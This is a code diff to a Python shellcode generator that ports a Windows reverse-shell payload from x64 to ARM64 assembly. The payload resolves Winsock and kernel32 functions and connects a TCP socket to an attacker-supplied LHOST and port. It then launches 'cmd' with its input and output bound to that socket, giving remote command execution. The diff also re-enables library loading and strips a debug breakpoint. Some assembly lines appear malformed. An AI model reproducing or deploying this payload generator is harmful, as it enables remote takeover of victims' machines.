@@ -90,7 +90,9 @@ class Shellcode():
         sc_args.update({
             "wsaData"                       : 0x00, 
             "name"                          : 0x00,
-            "lpStartInfo"                   : 0x00,
+            "lpStartInfo"                   : sizeof(_STARTUPINFOA),
+            "lpCommandLine"                 : len("cmd\x00"),
+            "lpProcessInformation"          : 0x00,
         })
 
         self.stack_space = calc_stack_space(sc_args,
@@ -104,24 +106,6 @@ class Shellcode():
     def get_kernel32(self):
         """Generates stub for obtaining the base address of Kernel32.dll
         """
-
-
-#rax -> x0
-#rbx -> x1
-#rcx -> x3
-#rdx -> x4
-#rsi -> x5
-#rdi -> x6
-#rbp -> x29
-#rsp -> sp
-#r8  -> x7
-#r9  -> x8
-#r10 -> x9
-#r11 -> x10
-#r12 -> x11
-#r13 -> x12
-#r14 -> x13
-#r15 -> x14
 
         stub = f"""
 getKernel32:
@@ -209,35 +193,35 @@ error:
         src = "\nload_library_{}:\n".format(lib.rstrip(".dll"))
 
         for i in range(len(lists["QWORD_LIST"])):
-            src += "    mov rcx, 0x{}\n".format( pack('<Q', lists["QWORD_LIST"][i]).hex() )
-            src += "    mov [rbp-{}], rcx\n".format(hex(write_index))
+            src += "    ldr x3, =0x{}\n".format( pack('<Q', lists["QWORD_LIST"][i]).hex() )
+            src += "    str x3, [x29, #-{}]\n".format(hex(write_index))
             write_index -= 8
 
         for i in range(len(lists["DWORD_LIST"])):
-            src += "    mov ecx, dword 0x{}\n".format( pack('<L', lists["DWORD_LIST"][i]).hex() ) 
-            src += "    mov [rbp-{}], ecx\n".format(hex(write_index))
+            src += "    ldr w3, =0x{}\n".format( pack('<L', lists["DWORD_LIST"][i]).hex() ) 
+            src += "    str w3, [x29, #-{}], ecx\n".format(hex(write_index))
             write_index -= 4
 
         for i in range(len(lists["WORD_LIST"])):
-            src += "    mov cx, 0x{}\n".format( pack('<H', lists["WORD_LIST"][i]).hex() )
-            src += "    mov [rbp-{}], cx\n".format(hex(write_index))
+            src += "    ldr w3, =0x{}\n".format( pack('<H', lists["WORD_LIST"][i]).hex() )
+            src += "    str w3, [x29, #-{}]\n".format(hex(write_index))
             write_index -= 2
 
         for i in range(len(lists["BYTE_LIST"])):
-            src += "    mov cl, {}\n".format( hex(lists["BYTE_LIST"][i]) )
-            src += "    mov [rbp-{}], cl\n".format(hex(write_index))
+            src += "    mov w3, #{}\n".format( hex(lists["BYTE_LIST"][i]) )
+            src += "    str w3, [x29, #-{}]\n".format(hex(write_index))
             write_index -= 1
 
         src += f"""
-    xor rcx, rcx
-    mov [rbp-{write_index}], cl
-    lea rcx, [rbp - {self.storage_offsets['functionName']}]
-    mov rax, [rbp - {self.storage_offsets['LoadLibraryA']}]
-    call rax
+    eor x3, x3, x3
+    strb w3, [x29, #-{write_index}]
+    add x0, x29, #-{self.storage_offsets['functionName']}
+    ldr x25, [x29, #-{self.storage_offsets['LoadLibraryA']}]
+    sub sp, sp, #0x50 ; Allocate 64 bytes for shadow stack
+    blr x25
+    add sp, sp, #0x50 ; Clean up
         """
         
-        src = ""
-
         return src
 
     def resolve_functions(self):
@@ -246,11 +230,11 @@ error:
 
         stub = ""
         for lib, imports in self.dependencies.items():
-#            if (lib != "Kernel32.dll"):
-#                stub += self.load_library(lib)
-#                stub += """
-#    mov x6, x0
-#                """
+            if (lib != "Kernel32.dll"):
+                stub += self.load_library(lib)
+                stub += """
+    mov x6, x0
+                """
 
             for func in range(len(imports)):
                 stub += f"""
@@ -278,7 +262,6 @@ get_{imports[func]}:
 
         shellcode = f"""
 _start:
-    brk #0
     stp x29, x30, [sp, #-{self.stack_space}]!
     mov x29, sp
 
@@ -288,105 +271,117 @@ _start:
 
         shellcode += self.resolve_functions()
         
-        shellcod = f"""
-; RAX => WSAStartup([in]  WORD      wVersionRequired, // RCX => MAKEWORD(2, 2) 
-;                   [out] LPWSADATA lpWSAData);       // RDX => &wsaData
+        shellcode += f"""
+; x0 => WSAStartup([in]  WORD      wVersionRequired, // x0 => MAKEWORD(2, 2) 
+;                  [out] LPWSADATA lpWSAData);       // x1 => &wsaData
 call_WSAStartup:
-    mov rcx, 0x202
-    lea rdx, [rbp - {self.storage_offsets['wsaData']}]
-    mov rax, [rbp - {self.storage_offsets['WSAStartup']}]
-    call rax
+    mov x0, 0x202
+    add x1, x29, #-{self.storage_offsets['wsaData']}
+    ldr x25, [x29, #-{self.storage_offsets['WSAStartup']}]
 
-; RAX => WSASocketA([in] int                 af,              // RCX      => AF_INET
-;                   [in] int                 type,            // RDX      => SOCK_STREAM
-;                   [in] int                 protocol,        // R8       => IPPROTO_TCP
-;                   [in] LPWSAPROTOCOL_INFOA lpProtocolInfo,  // R9       => NULL
-;                   [in] GROUP               g,               // RSP+0x20 => NULL
-;                   [in] DWORD               dwFlags);        // RSP+0x28 => NULL
+    sub sp, sp, #0x50 ; Allocate 64 bytes for shadow stack
+    blr x25
+    add sp, sp, #0x50 ; Clean up
+
+; x0 => WSASocketA([in] int                 af,              // x0      => AF_INET
+;                  [in] int                 type,            // x1      => SOCK_STREAM
+;                  [in] int                 protocol,        // x2      => IPPROTO_TCP
+;                  [in] LPWSAPROTOCOL_INFOA lpProtocolInfo,  // x3      => NULL
+;                  [in] GROUP               g,               // x4      => NULL
+;                  [in] DWORD               dwFlags);        // x5      => NULL
 call_WSASocketA:
-    mov ecx, {AF_INET}
-    mov edx, {SOCK_STREAM}
-    mov r8, {IPPROTO_TCP}
-    xor r9, r9
-    mov [rsp+0x20], r9
-    mov [rsp+0x28], r9
-    mov rax, [rbp - {self.storage_offsets['WSASocketA']}]
-    call rax
-    mov rsi, rax ; save the socket file descriptor (sockfd)
+    mov x0, {AF_INET}
+    mov x1, {SOCK_STREAM}
+    mov x2, {IPPROTO_TCP}
+    eor x3, x3, x3
+    eor x4, x4, x4
+    eor x5, x5, x5
+    ldr x25, [x29, #-{self.storage_offsets['WSASocketA']}]
+    
+    sub sp, sp, #0x50 ; Allocate 64 bytes for shadow stack
+    blr x25
+    add sp, sp, #0x50 ; Clean up
+    
+    mov x26, x0 ; save the socket file descriptor (sockfd)
 
-; RAX => connect([in] SOCKET s,             // RCX => sockfd (Obtained from WSASocketA)
-;                [in] const sockaddr *name, // RDX => {{ IP | PORT | SIN_FAMILY }}
-;                [in] int namelen);         // R8  => sizeof(sockaddr)
+; x0 => connect([in] SOCKET s,             // x0 => sockfd (Obtained from WSASocketA)
+;               [in] const sockaddr *name, // x1 => {{ IP | PORT | SIN_FAMILY }}
+;               [in] int namelen);         // x2  => sizeof(sockaddr)
 call_connect:
-    mov rcx, rax
-    mov r8, {sizeof(sockaddr)}
-    lea rdx, [rbp - {self.storage_offsets['name']}]
-    mov r9, {hex(ip_str_to_inet_addr(argv_dict['LHOST']))}{pack('<H', lport).hex()}0002
-    mov [rdx], r9
-    xor r9, r9
-    mov [rdx + 0x8], r9
-    mov rax, [rbp - {self.storage_offsets['connect']}]
-    call rax
+    mov x0, x26
+    add x1, x29, #-{self.storage_offsets['name']}
+    mov x2, {sizeof(sockaddr)}
+    ldr x25, ={hex(ip_str_to_inet_addr(argv_dict['LHOST']))}{pack('<H', lport).hex()}0002
+    str x25, [x1]
+    eor x25, x25, x25
+    str x25, [x1, #0x08]
+    ldr x25, [x29, #-{self.storage_offsets['connect']}]
 
-; [RBX] => typedef struct _STARTUPINFOA {{ }}
+    sub sp, sp, #0x100 ; Allocate 64 bytes for shadow stack
+    blr x25
+    add sp, sp, #0x100 ; Clean up
+
+
+; [x24/x6] => typedef struct _STARTUPINFOA {{ }}
 setup_STARTUPINFOA:
-    mov rdi, rbp
-    add rdi, {self.storage_offsets['lpStartInfo']}
+    add x6, x29, #{self.storage_offsets['lpStartInfo']}
+    mov x24, x6
+    mov x0, x6
+    mov x1, #0x00
+    mov x2, {sizeof(_STARTUPINFOA)}
+    mov w3, w1
+memset_loop:
+    strb w3, [x0], #1
+    subs x2, x2, #1
+    b.ne memset_loop
+    mov w5, #{sizeof(_STARTUPINFOA)}
+    str w5, [x6]
+    mov w5, #{STARTF_USESTDHANDLES}
+    str w5, [x6, #{_STARTUPINFOA.dwFlags.offset}]
+    str x26, [x6, #{_STARTUPINFOA.hStdInput.offset}]
+    str x26, [x6, #{_STARTUPINFOA.hStdOutput.offset}]
+    str x26, [x6, #{_STARTUPINFOA.hStdError.offset}]
 
-    mov rbx, rdi  ; RDI = Destination ( memset(rdi, value, x) )
-    xor eax, eax  ; EAX = 0x00 (value)
-    mov ecx, 0x20 ; 0x20 * sizeof(DWORD) = (x -> 0x80)
-    rep stosd     ; Zero out x bytes
-
-    mov eax, {sizeof(_STARTUPINFOA)} ; lpStartInfo.cb = sizeof(_STARTUPINFO)
-    mov [rbx], eax
-
-    mov eax, {STARTF_USESTDHANDLES}
-    mov [rbx + {_STARTUPINFOA.dwFlags.offset}], eax
-    mov [rbx + {_STARTUPINFOA.hStdInput.offset}], rsi
-    mov [rbx + {_STARTUPINFOA.hStdOutput.offset}], rsi
-    mov [rbx + {_STARTUPINFOA.hStdError.offset}], rsi
-
-; RAX => CreateProcessA([in, optional]      LPCSTR                lpApplicationName,     // RCX      => NULL
-;                       [in, out, optional] LPSTR                 lpCommandLine,         // RDX      => "cmd"
-;                       [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,   // R8       => NULL
-;                       [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,    // R9       => NULL
-;                       [in]                BOOL                  bInheritHandles,       // RSP+0x20 => NULL
-;                       [in]                DWORD                 dwCreationFlags,       // RSP+0x28 => 0x01 (DEBUG_PROCESS)
-;                       [in, optional]      LPVOID                lpEnvironment,         // RSP+0x30 => NULL
-;                       [in, optional]      LPCSTR                lpCurrentDirectory,    // RSP+0x38 => NULL
-;                       [in]                LPSTARTUPINFOA        lpStartupInfo,         // RSP+0x40 => &lpStartupInfo
-;                       [out]               LPPROCESS_INFORMATION lpProcessInformation); // RSP+0x48 => &lpStartupInfo ()
+; x0 => CreateProcessA([in, optional]      LPCSTR                lpApplicationName,     // x0 => NULL
+;                      [in, out, optional] LPSTR                 lpCommandLine,         // x1 => "cmd"
+;                      [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,   // x2 => NULL
+;                      [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,    // x3 => NULL
+;                      [in]                BOOL                  bInheritHandles,       // x4 => 0x01
+;                      [in]                DWORD                 dwCreationFlags,       // x5 => NULL
+;                      [in, optional]      LPVOID                lpEnvironment,         // x6 => NULL
+;                      [in, optional]      LPCSTR                lpCurrentDirectory,    // x7 => NULL
+;                      [in]                LPSTARTUPINFOA        lpStartupInfo,         // [sp, #0x20] => &lpStartupInfo
+;                      [out]               LPPROCESS_INFORMATION lpProcessInformation); // [sp, #0x28] => &lpStartupInfo ()
 call_CreateProccessA:
-    xor ecx, ecx                 ; lpApplicationName
-    mov rdx, rbp                 ; lpCommandLine
-    add rdx, 0x180               ;
-    mov eax, 0x646d63            ; "cmd"
-    mov [rdx], rax
-    xor r8, r8                   ; lpProcessAttributes
-    xor r9, r9                   ; lpThreadAttributes
-    xor eax, eax                 ;
-    inc eax
-    mov [rsp + 0x20], rax        ; bInheritHandles
-    dec eax
-    mov [rsp + 0x28], rax        ; dwCreationFlags
-    mov [rsp + 0x30], rax        ; lpEnvironment
-    mov [rsp + 0x38], rax        ; lpCurrentDirectory
-    mov [rsp + 0x40], rbx        ; lpStartupInfo
-    add rbx, 0x68
-    mov [rsp + 0x48], rbx        ; lpProcessInformation
-    mov rax, [rbp - {self.storage_offsets['CreateProcessA']}]
-    call rax
+    eor x0, x0, x0
+    ldr x5, =0x646d63
+    str x5, [x29, #-{self.storage_offsets['lpCommandLine']}]
+    add x1, x29, #-{self.storage_offsets['lpCommandLine']}
+    eor x2, x2, x2
+    eor x3, x3, x3
+    eor x5, x5, x5
+    mov x4, #0x01
+    eor x6, x6, x6
+    eor x7, x7, x7
+    sub sp, sp, #0x300
+    str x24, [sp, #0x0]
 
-; RAX => TerminateProcess([in] HANDLE hProcess,   // RCX => -1 (Current Process)
-;                         [in] UINT   uExitCode); // RDX => 0x00 (Clean Exit)
+    add x24, x29, #-{self.storage_offsets['lpProcessInformation']}
+    str x24, [sp, #0x8]
+
+    ldr x25, [x29, #-{self.storage_offsets['CreateProcessA']}]
+    blr x25
+    add sp, sp, #0x300
+
+; x0 => TerminateProcess([in] HANDLE hProcess,   // x0 => -1 (Current Process)
+;                        [in] UINT   uExitCode); // x1 => 0x00 (Clean Exit)
 call_TerminateProcess:
-	xor rcx, rcx
-	dec rcx
-	xor rdx, rdx
-	mov rax, [r15 + {self.storage_offsets['TerminateProcess']}]
-	call rax
-
+	eor x0, x0, x0
+    mov x1, #-0x01
+	ldr x25, [x29, #-{self.storage_offsets['TerminateProcess']}]
+    sub sp, sp, #0x50
+	blr x25
+    add sp, sp, #0x50
 fin:
     ldp x29, x30, [sp], #16
     ret
@@ -394,8 +389,6 @@ fin:
 
         shellcode += self.get_kernel32()
         shellcode += self.lookup_function()
-
-        print(shellcode)
 
         return shellcode
 
